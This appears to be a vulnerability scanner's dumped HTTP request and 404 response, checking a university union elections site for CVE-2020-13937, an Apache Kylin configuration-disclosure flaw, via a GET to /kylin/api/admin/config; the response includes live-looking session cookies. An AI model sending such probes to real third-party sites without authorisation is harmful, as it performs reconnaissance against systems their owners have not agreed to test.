@@ -1,0 +1,39 @@
+[CVE-2020-13937] Dumped HTTP request for https://elections.union.unimelb.edu.au/kylin/api/admin/config
+
+
+GET /kylin/api/admin/config HTTP/1.1
+Host: elections.union.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+Content-Type: application/json
+Accept-Encoding: gzip
+
+
+[CVE-2020-13937] Dumped HTTP response https://elections.union.unimelb.edu.au/kylin/api/admin/config
+
+HTTP/1.1 404 Not Found
+Connection: close
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=iso-8859-1
+Date: Wed, 06 Aug 2025 15:17:31 GMT
+Server: Apache/2.4.52 (Ubuntu)
+Set-Cookie: BIGipServer~app_icat_web_prod~pool_icat_web_prod_prod1_2=3259242412.20480.0000; path=/; Httponly; Secure
+Set-Cookie: visid_incap_3220071=9TNE2EylSJiExV02ge1LCQtyk2gAAAAAQUIPAAAAAADW0+s+89RUWCo7HfpEqO6n; expires=Thu, 06 Aug 2026 07:06:46 GMT; HttpOnly; path=/; Domain=.union.unimelb.edu.au; Secure; SameSite=None
+Set-Cookie: nlbi_3220071=s1GrdXDDVio2Wlx2yn8OZQAAAABgJYiPoPDlmP/AAHElx5+9; HttpOnly; path=/; Domain=.union.unimelb.edu.au; Secure; SameSite=None
+Set-Cookie: incap_ses_237_3220071=oWR/EHTzBFAP6Larov5JAwtyk2gAAAAAsP3rw0h1CLy9mbIjQPuSUg==; path=/; Domain=.union.unimelb.edu.au; Secure; SameSite=None
+Strict-Transport-Security: max-age=31536000
+X-Cdn: Imperva
+X-Iinfo: 3-2162513-2162518 NNYN CT(212 228 0) RT(1754493451427 19) q(0 0 4 -1) r(6 6) U24
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head><script src="/alband-Then-now-not-by-the-wortune-Vpon-his-Fee-" async></script>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+<hr>
+<address>Apache/2.4.52 (Ubuntu) Server at elections.union.unimelb.edu.au Port 80</address>
+</body></html>
+
